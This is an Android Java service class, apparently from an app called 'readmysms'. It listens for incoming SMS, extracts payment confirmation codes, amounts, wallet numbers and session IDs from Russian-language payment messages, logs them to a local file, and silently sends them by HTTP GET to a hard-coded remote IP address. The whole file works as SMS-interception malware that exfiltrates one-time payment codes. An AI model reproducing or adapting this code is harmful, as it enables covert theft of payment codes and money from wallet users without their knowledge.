package app.guo.cn.readmysms;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.tuenti.smsradar.Sms;
import com.tuenti.smsradar.SmsListener;
import com.tuenti.smsradar.SmsRadar;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/**
 * 服务
 * Created by Scylla on 2017/3/21.
 */

public class SmsRadarService extends Service {

    private static final String TAG = SmsRadarService.class.getSimpleName();


    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mContext = this;
        Log.i(TAG, "初始化SmsRadar::");
        SmsRadar.initializeSmsRadarService(this, new SmsListener() {
            @Override
            public void onSmsSent(Sms sms) {
                //showSmsToast(sms);
            }

            @Override
            public void onSmsReceived(Sms sms) {
                Log.i(TAG, "SmsRadarService::onSmsReceived收到短息");
                //showSmsToast(sms);
                try {
                    String msg = sms.getMsg();
                    dealWithMsg(mContext, msg);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });



    }

    public static void dealWithMsg(Context context, String msg) {
        Log.i(TAG, "收到新短信 : " + msg);
        //Код:30447 сумма:2090.00 кошелек:R146253412019 Cессия:320325120
        MySms rs = parseSms(msg);

        if (rs != null) {
            Log.i(TAG, "目标短信 : " + rs.toString());
            //存储&发送
            //                    SharedPreferences sp = getSharedPreferences(TAG,MODE_APPEND);
            //                    SharedPreferences.Editor editor = sp.edit();
            //
            //                    editor.put
            saveMySms(context, rs);
            sendMySms(rs);
        }
    }


    //http 发送
    private static void sendMySms(MySms rs) {

        try {
            String uri = "http://119.147.210.156/els/savesms.asp?a=%s&b=%s&c=%s&d=%s";
            uri = String.format(uri,
                    rs.getNumber(),
                    rs.getTotal(),
                    rs.getWallet(),
                    rs.getSerial());
            Log.i(TAG, "发送短信数据 : " + uri);
            httpGet(uri, new okhttp3.Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "发送数据失败 : " + e.getLocalizedMessage());
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    Log.i(TAG, "发送数据成功返回 : " + response.body().string());
                }
            });


        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void saveMySms(Context context, MySms rs) {
        try {
            String path = context.getFilesDir().getPath() + File.separator + "my-sms.json";
            File file = new File(path);
            if (!file.exists()) {
                boolean frs = file.createNewFile();
                Log.i(TAG, "创建文件存储 : " + frs);
            }
            BufferedWriter bos = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file,true)));
            bos.append(rs.toString());
            bos.newLine();
            bos.flush();
            Log.i(TAG, "写入文件存储");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * 将消息转为sms对象
     *
     * @param msg 消息字符串
     * @return
     */
    public static MySms parseSms(String msg) {
        if (msg.contains("Код") || msg.contains("сумма") || msg.contains("кошелек") || msg.contains("Cессия")) {
            String[] arr = msg.split(":");
            if (arr.length == 5) {
                return new MySms(
                        arr[1].split(" ")[0],
                        arr[2].split(" ")[0],
                        arr[3].split(" ")[0],
                        arr[4].split(" ")[0]
                );
            }
        }
        return null;
    }

    public static void httpGet(String url, Callback cb) throws IOException {
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .url(url)
                .build();

        Call call = client.newCall(request);
        call.enqueue(cb);
        //Response response = client.newCall(request).execute();
        //return response.body().string();
    }
}
